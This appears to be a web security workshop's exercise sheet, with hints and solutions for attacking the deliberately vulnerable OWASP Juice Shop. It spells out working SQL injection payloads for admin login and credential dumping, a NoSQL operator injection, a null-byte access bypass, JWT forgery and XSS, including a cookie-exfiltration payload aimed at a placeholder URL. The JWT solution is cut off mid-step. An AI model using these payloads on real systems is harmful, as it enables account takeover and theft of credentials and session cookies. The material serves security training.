# Exercises

Make sure you understand the feature you are analysing for vulnerabilities.
Before attempting any exploits, walk the "happy path" and investigate if the feature works as expected.


## Zero Stars

Give a devestating zero-start feedback to the store. You find the feedback form at `/#/contact`.

<details>
  <summary>❓ Hint 1</summary>
Can you enable the button with the developer tools?

</details>

<details>
  <summary>❓ Hint 2</summary>
There is another way: Use ZAP to find the request and replay it with a 0 value.
    
</details>

<details>
  <summary>📚 Solution</summary>
<h3>Approach 1</h3>

- Visit `/#/contact`
- Don't change the rating, enter some comment and solve the CAPTCHA
- Right click on the submit button and inspect the element
- Remove the `disabled="true"` attribute
- Submit the form by clicking submit

<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/zero-star-sol1.png?raw=true" alt="Screenshot that explains how to remove the disabled attribute of the button"/>

<h3>Approach 2</h3>

1. Open ZAP and the browser such that the traffic is routed through ZAP
2. Visit the `/#/contact` site
3. Walk the happy path and submit a non-zero rating
4. Find the request that was triggered in the "History" when submitting the non-zero rating
5. Right click on the entry and click on "Open/Resend with Request Editor..."
6. Replace the submitted rating with 0 and send the request
7. Congrats, you're done :)

<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/zero-star-sol2.png?raw=true" alt="Screenshot that explains how to use ZAP to reply the message"/>

</details>


## Payback Time

Place an order that makes you rich.

<details>
  <summary>❓ Hint 1</summary>
When you order an item, you pay money. When you sell an item, you are being paid. Basic economics.
</details>

<details>
  <summary>❓ Hint 2</summary>
Have you tried ordering a negative amount of items?
</details>

<details>
  <summary>📚 Solution</summary>

1. Open ZAP and the browser such that the traffic is routed through ZAP
2. Put any item into the basket
3. Have a look at your basket and increase the number of ordered items
4. Find the request that was triggered when increasing the number of ordered items
5. Resend the request with a negative number of items
<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/payback-time-sol1.png?raw=true" alt="Payback Time solution graphic: Request to reply"/>

6. Reload the basked an verify that you now have a negative total price
7. Proceed to checkout and cash in!

<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/payback-time-sol2.png?raw=true" alt="Payback Time solution graphic: Checkout"/>

</details>


## Confidential Document

Access a confidential document.
Reading the about us (`/#/about`) might nudge you in the right direction.


<details>
  <summary>❓ Hint 1</summary>
Robots are certainly disallowed to access confidential files.
How would you tell google to hide a directory?
</details>

<details>
  <summary>📚 Solution</summary>

<h3>Approach 1</h3>

1. The "about us" page has a link to `/ftp/legal.md`
2. Have a look at the `/ftp` folder
3. Access the `acquisitions.md` file

Note: In this exercise, we nudged you towards the solution, but in practice an attacker would for instance use the ZAP Proxy's Spider functionality and then a domain fly-over tool (e.g. aquatone) to discover interesting resources.


<h3>Approach 2</h3>

1. In order to tell the robots of search engines not to inspect certain pages one can define a `robots.txt` file in the root directory
2. Have a look at the `/robots.txt` folder
3. `Disallow: /ftp` certainly sounds interesting
4. Have a look at the `/ftp` folder
5. Access the `acquisitions.md` file

</details>


## View Basket

You need some inspiration on what to buy. View another user's shopping basket.

<details>
  <summary>❓ Hint 1</summary>
Observe the HTTP traffic using ZAP when shopping. Is there a request with an interesting parameter that you could change in your favor?
</details>

<details>
  <summary>📚 Solution</summary>

1. Open ZAP and the browser such that the traffic is routed through ZAP
2. Put any item into the basket
3. Have a look at your basket
4. Observe the GET request to `/rest/basket/{nr}`
5. Reply the request with another number

<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/view-basket-sol1.png?raw=true" alt="View basket solution graphic: replied request"/>

</details>


## Forged Review

Privacy is important. Post a product review as another user or edit any user's existing review.

<details>
  <summary>❓ Hint 1</summary>
Observe the HTTP traffic using ZAP while submitting a review for the "Apple Juice". Can you alter any interesting parameters when sending a request to `/rest/products/1/reviews`?
</details>

<details>
<summary>📚 Solution</summary>

1. Open ZAP and the browser such that the traffic is routed through ZAP
2. Submit a review for the "Apple Juice"
3. Edit and resend the PUT request to `/rest/products/1/reviews`, with another author. For instance:
```
{"message":"This is a low-quality product. I can't recommend it.","author":"admin@juice-sh.op"}
```
</details>


## Login Admin

Sometimes it is boring to be a normal user. Login as the administrator (admin@juice-sh.op) instead.

<details>
  <summary>❓ Hint 1</summary>
User credentials are generally stored in a database, can you perform an injection that results in a positive query reply?
</details>

<details>
  <summary>❓ Hint 2</summary>
The email field is vulnerable.
</details>

<details>
  <summary>❓ Hint 3</summary>
Don't forget to comment out the trash after the injected commands.
</details>


<details>
<summary>📚 Solution</summary>

1. Try entering the email of the admin concatinated with a single quote `'`
2. There is an error, which can be an indicator for an SQLi vulnerability. And indeed, if we inspect the server response in ZAP, we even see a detailed error message, that indicates a SQLi
```json
{
  "error": {
    "message": "SQLITE_ERROR: unrecognized token: \"5f4dcc3b5aa765d61d8327deb882cf99\"",
    "stack": "SequelizeDatabaseError: SQLITE_ERROR: unrecognized token: \"5f4dcc3b5aa765d61d8327deb882cf99\"\n    at Query.formatError (/home/loris/workspace/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:403:16)\n    at Query._handleQueryResponse (/home/loris/workspace/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:72:18)\n    at afterExecute (/home/loris/workspace/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:238:27)\n    at Statement.errBack (/home/loris/workspace/juice-shop/node_modules/sqlite3/lib/sqlite3.js:14:21)",
    "name": "SequelizeDatabaseError",
    "parent": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = 'admin@juice-sh.op'' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NULL"
    },
    "original": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = 'admin@juice-sh.op'' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NULL"
    },
    "sql": "SELECT * FROM Users WHERE email = 'admin@juice-sh.op'' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NULL"
  }
}
```
3. In order to login, we want the following query to return the elements of the user with the email `admin@juice-sh.op`:
```javascript
"SELECT * FROM Users WHERE email = '" + email + "' AND password = '" + f(password) + "' AND deletedAt IS NULL;"
```
</details>
There are multiple possibilities, but the easiest is `admin@juice-sh.op';--`, as this will result in
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op';--' AND password = '" + f(password) + "' AND deletedAt IS NULL;
```
which is equivalent to
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op';
```
4. Login with `admin@juice-sh.op';--` as email and an arbitrary password.


## User Credentials

Data is power. Steal all user credentials by abusing the search functionality.

<details>
  <summary>❓ Hint 0 (the endpoint)</summary>
The vulnerable (legacy) search endpoint is located under the following path `/rest/products/search?q=<SEARCH QUERY>`.
You can find it by analyzing the traffic when reloading `/#/search?q=`.
</details>

<details>
  <summary>❓ Hint 1</summary>
The endpoint is vulnerable to SQL injections.
When exploiting a SQL injection, make sure that you know how to properly close the query.
Start by crafting a simple query that doesn't result in an error (e.g. does `test';--` work, or are there for instance any open brackets left?)
</details>

<details>
  <summary>❓ Hint 2</summary>
Exploit the SQLi by crafting an `UNION SELECT` query to join the data from another table to the results. Try to find out how many columns are necessary!
</details>

<details>
  <summary>❓ Hint 3</summary>
Use the `sqlite_schema` table to extract the relevant table names.
</details>

<details>
  <summary>❓ Hint 4</summary>
Use the `PRAGMA_TABLE_INFO('TABLE NAME GOES HERE')` table to extract the relevant column names.
</details>

<details>
<summary>📚 Solution</summary>
1. When analyzing `/#/search?q=juice` you will probably notice that it is a client-side implemented search, but we are looking for a server-side search to exploit an injection vulnerability.
By analyzing and playing around you can find the legacy server-side search by reloading the `/#/search?q=` endpoint: `/rest/products/search?q=<SEARCH QUERY>`
2. As in the <a href="#login-admin">Login Admin</a> exercise, we first try to provoke an error. Some text with a quote is always a good start: `juice'`
3. Indeed, we get an error. However, this time the error is less revealing as previously. In that case, one generally tries to fix the query by starting a comment: `juice'--`
4. This results in a "incomplete input" error, which indicates that some bracket might be open. After some trail and error, one discovers that two parenthesis are needed to complete the query: `juice'))--`
5. Now the fun begins, we want to craft an `UNION SELECT` query to read out the credentials. In a first step we assess the number of columns by trail and error. 9 seems to be the number:
```
/rest/products/search?q=juice%27))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9;--
```
6. In the next step, we have to find the table name for the user credentials. This can be done by guessing or by reading the `sqlite_schema` table.
```
/rest/products/search?q=juice%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9 from sqlite_schema;--
```
The table `Users` is the most likely to contain the user credentials.
7. Now, we need to know the column names, once again we can guess or use a sqlite feature to determine the relevant names.
```
/rest/products/search?q=juice%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9 from PRAGMA_TABLE_INFO('Users');--
```
The columns `email` and `password` appear to be what we are looking for.
8. At this point, we have all we need to query the user credentials:
```
/rest/products/search?q=juice%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9 from Users;--
```

</details>


## NoSQL Manipulation

Look at the endpoint `PATCH /rest/products/reviews`.
Update multiple product reviews at the same time.

```javascript
module.exports = function productReviews () {
  return (req, res, next) => {
    const user = security.authenticatedUsers.from(req)
    db.reviews.update(
      { _id: req.body.id },
      { $set: { message: req.body.message } },
      { multi: true }
    ).then(
      result => {
        res.json(result)
      }, err => {
        res.status(500).json(err)
      })
  }
}
```

<details>
  <summary>❓ Hint 1</summary>
Read the documentation of
<a href="https://www.mongodb.com/docs/manual/reference/method/db.collection.update/">`db.collection.update` documentation</a>
and the <a href="https://www.mongodb.com/docs/manual/reference/operator/query/">query operators documentation</a>.

Which query allows you to change multiple reviews at the same time?
</details>

<details>
  <summary>📚 Solution</summary>

1. We observe that we control the `_id` value via the `req.body.id` parameter.
As we gather from <a href="https://www.mongodb.com/docs/manual/reference/method/db.collection.update/">`db.collection.update`'s documentation</a>, we can edit multiple entries, since the `multi` option is set to true.
The <a href="https://www.mongodb.com/docs/manual/reference/operator/query/">query operators documentation</a> explains different query selectors which can be used.
Hence instead of querying a specific id, we use a query selector such as `$ne`, or more precisely `{"$ne": -1}`.
2. Edit a product review while proxing the traffic through ZAP. This results in a `PATH /rest/products/reviews`.
Edit the request and send the following PATCH request
```
{"id":{"$ne":-1},"message":"would not buy again"}
```
</details>


## Null-Byte Injection

Download `/ftp/package.json.bak`.
Note node.js handles null-bytes differently than the underlying library which is written in C.

<details>
  <summary>❓ Hint 1</summary>
In C strings are terminated by a NULL byte.
Thus the string "hello.txt■.md" (with ■ representing the NULL byte) will be seen as "hello.txt■.md" in node.js, but as "hello.txt" in the low level library that opens the file.
How can this be exploited, when the access verification happens in node.js?
</details>

<details>
  <summary>❓ Hint 2</summary>
A url encoded null byte is represented as "%00", however, make sure you properly encode it when submitting the request.
</details>

<details>
  <summary>📚 Solution</summary>

We have to urlencode the % properly, then you are able to bypass the access control: `/ftp/package.json.bak%2500.md`

</details>


## Federated Authentication

Find a website with a social login and use ZAP to observe what happens when you sign in.  
Example: https://oag.azurewebsites.net


## JSON Web Token
Analyze a JWT from the shop with https://jwt-attacker.onrender.com

- What claims are in the token?
- How is it signed?

<details>
  <summary>📚 Solution</summary>

Inspect a request in ZAP, you find a `Authorization` header with a JWT.

The decoded JWT:
```json
{
  "typ": "JWT",
  "alg": "RS256"
}.
{
  "status": "success",
  "data": {
    "id": 21,
    "username": "",
    "email": "bla@bla.com",
    "password": "5f4dcc3b5aa765d61d8327deb882cf99",
    "role": "customer",
    "deluxeToken": "",
    "lastLoginIp": "127.0.0.1",
    "profileImage": "/assets/public/images/uploads/default.svg",
    "totpSecret": "",
    "isActive": true,
    "createdAt": "2022-04-25 06:00:37.724 +00:00",
    "updatedAt": "2022-04-25 06:11:39.984 +00:00",
    "deletedAt": null
  },
  "iat": 1650871490,
  "exp": 1650889490
}
.h-IJxnfpWv5sX6pq3Y_JigCMcf2dKBhokgzsI5ZbM9tUdvQdsT8iuCDVrjs2XSVBwEMfzdkCh_hmJIzfRgW8QnpZfuk3lXCJNlZzr93edC8cjxPwwQBsBQZhZ_GRvRHyoUT7bSMPUNP4T035HzGSUKLEsBsdP5THaMgt2ZwKjeQ
```

The claims can be seen in the above extract.

The signature algorithm is RS256, which stands for RSA Signature with SHA-256.

</details>


## Unsigned JWT

Forge an essentially unsigned JWT that impersonates the (non-existing) user jwtn3d@juice-sh.op.

<details>
  <summary>❓ Hint 1</summary>
Exploit a weird option, that is available when signing tokens with JWT.
</details>

<details>
  <summary>❓ Hint 2</summary>
The weird option is the none algorithm ;)
</details>


<details>
  <summary>📚 Solution</summary>

1. Decode the JWT from 
2. Replace the `alg` value to none and remove the signature.
3. Update the email claim with jwtn3d@juice-sh.op.
4. Encode the

</details>


## DOM XSS

Perform a DOM XSS attack with the following payload: `<iframe src="javascript:alert(`xss`)">`.

<details>
  <summary>❓ Hint 1</summary>
Did you try searching?
</details>


## Blind Persistent XSS

Perform a (blind) persistent XSS attack bypassing a client-side security mechanism.

- The admin can see a list of all users on `/#/administration`
- Admin login: admin@juice-sh.op / admin123

Can you extract the cookies and send it to you (https://requestbin.net/ might be helpful)?

<details>
  <summary>❓ Hint 1</summary>
What information is displayed to the admin? When can you set it?
</details>

<details>
  <summary>❓ Hint 2</summary>
When registering a new user the endpoint `/api/Users` is contacted. This looks interesting...
</details>

<details>
  <summary>❓ Hint 3 (Cookie exfiltration)</summary>
Have you tried the following?
```
<img src=x onerror="this.src='YOUR.URL?'+document.cookie; this.removeAttribute('onerror');">
```
</details>


## Content Security Policy

Search for a websites with a CSP. How does the CSP of your favorite bank look like?


## CSRF

Change the name of a user by performing Cross-Site Request Forgery from another origin.

- Make your own attacker web-site that changes a logged-in user's Juice Shop username when she/he visits your site.
- Note: You need to use Firefox, because it does not treat cookies as `same-site=lax` per default.
- Can you do it with a CORS request and an autosubmitting `<form>`?
- Use a local file or `https://htmledit.squarefree.com` to simulate a different website.

<details>
  <summary>❓ Hint 1</summary>
`POST /profile`
</details>


## Frontend Typosquatting

[Inform the shop](http://localhost:3000/#/contact) about a typosquatting imposter that dug itself deep into the frontend (Mention the exact name of the culprit in the contact form).

<details>
  <summary>❓ Hint 1</summary>
Inspect the package.json.bak from the <a href="#null-byte-injection">Null-Byte Injection exercise</a>.
</details>


## Vulnerable Library

[Inform the shop](http://localhost:3000/#/contact) about a vulnerable library it is using (Mention the exact library name and version in your comment).

<details>
  <summary>❓ Hint 1</summary>
Inspect the package.json.bak from the <a href="#null-byte-injection">Null-Byte Injection exercise</a>.
</details>


## Dependency Scanning

Use Snyk or any other dependency scanner to analyze the Juice Shop's dependencies.

- Are there any outdated packages?
- How severe are the issues?


## OWASP ZAP Scanning

Use OWASP ZAP to perform an automated dynamic test of your Juice Shop.

`docker run --net=host -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000`

- What kind of vulnerabilities does it find?
- Do you think it is useful?
- If you are interested, try the full scan.
